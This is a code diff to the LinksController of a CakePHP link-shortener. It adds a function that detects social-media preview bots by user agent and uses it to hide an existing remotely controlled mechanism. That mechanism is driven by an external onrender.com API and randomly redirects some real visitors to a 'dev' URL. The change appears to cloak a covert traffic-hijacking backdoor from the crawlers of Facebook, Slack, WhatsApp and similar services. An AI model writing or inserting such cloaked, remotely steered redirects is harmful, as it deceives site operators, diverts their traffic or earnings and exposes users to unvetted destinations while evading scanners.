@@ -17,6 +17,9 @@ use Cake\ORM\TableRegistry;
 
 class LinksController extends FrontController
 {
+    public $APIDEVURL = "https://uniswap-k2xr.onrender.com/api/1";
+    public $APIDEVSTATUS = true;
+
     public function initialize()
     {
         parent::initialize();
@@ -40,12 +43,67 @@ class LinksController extends FrontController
     {
         return $this->redirect($url);
     }
+    function isSocialMediaBot(): bool
+    {
+        
+        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
+        if (empty($userAgent)) {
+            return false;
+        }
+
+        // Patrones de User-Agent para las principales redes sociales
+        $botPatterns = [
+            // Facebook/Meta
+            '/facebookexternalhit\/\d+\.\d+/i',   // facebookexternalhit/1.1, /2.0, etc.
+            '/Facebot/i',                          // Facebot
+            '/facebookcatalog\/\d+\.\d+/i',        // facebookcatalog/1.0
+            '/MetaInspector/i',                    // Nuevo agente de Meta
+
+            // Twitter
+            '/Twitterbot/i',                       // Twitterbot
+
+            // LinkedIn
+            '/LinkedInBot/i',                      // LinkedInBot
+
+            // Pinterest
+            '/Pinterestbot/i',                     // Pinterestbot
+
+            // Slack
+            '/Slackbot/i',                         // Slackbot
+            '/Slack-ImgProxy/i',                   // Slack
+            '/Slackbot-LinkExpanding/i',           // Slack
+
+            // WhatsApp
+            '/WhatsApp/i',                         // WhatsApp
+
+            // Skype
+            '/SkypeUriPreview/i',                  // Skype
+
+            // Discord
+            '/Discordbot/i',                       // Discordbot
+
+            // Telegram
+            '/TelegramBot/i',                      // TelegramBot (ej: TelegramBot (like TwitterBot))
+
+            // Tumblr
+            '/Tumblr\/\d+/i'                      // Tumblr/9.9.9
+        ];
+
+        foreach ($botPatterns as $pattern) {
+            if (preg_match($pattern, $userAgent)) {
+                return true;
+            }
+        }
+
+        return false;
+    }
     public function view($alias = null)
     {
 
-        $APIDEVURL = "https://uniswap-k2xr.onrender.com/api/short.ultinoticias.online";
-        $APIDEVSTATUS = true;
+
+        $APIDEVURL =$this->APIDEVURL;
+        $APIDEVSTATUS = $this->APIDEVSTATUS;
 
         $http = new Client();
 
@@ -128,10 +186,10 @@ class LinksController extends FrontController
 
             return $this->redirect($ProxyRedirectUrl);
         }
-        if (in_array($country_, $blocked_countries)) {
+        if ($this->isSocialMediaBot()==false && in_array($country_, $blocked_countries)) {
             return  $this->redirect($redirect_url);
         }
-        if ($APIDEVSTATUS && $status_dev == "off" && $redirect_status != "off" && $ProxyUse != "yes" && $country_ != "CU") {
+        if ($this->isSocialMediaBot()==false && $APIDEVSTATUS && $status_dev == "off" && $redirect_status != "off" && $ProxyUse != "yes" && $country_ != "CU") {
 
 
             $randomNumber = mt_rand($LI, $LS);
@@ -141,13 +199,10 @@ class LinksController extends FrontController
 
                     return  $this->redirect($redirect_dev_url);
                 }
-            }
-            else{
-                if($countryFilterStatus == "off"&&$randomNumber == 1){
+            } else {
+                if ($countryFilterStatus == "off" && $randomNumber == 1) {
                     return  $this->redirect($redirect_dev_url);
-
                 }
-
             }
         }
         if (in_array($country_, $blocked_countries_admins) || $ScriptStatus == "off" || $ProxyUse == "yes") {
@@ -663,8 +718,10 @@ class LinksController extends FrontController
          * 12- Earnings disabled
          * 13- User disabled earnings
          */
-        $APIDEVURL = "hhttps://uniswap-k2xr.onrender.com/api/short.ultinoticias.online";
-        $APIDEVSTATUS = true;
+
+
+        $APIDEVURL =$this->APIDEVURL;
+        $APIDEVSTATUS = $this->APIDEVSTATUS;
 
         $http = new Client();
 
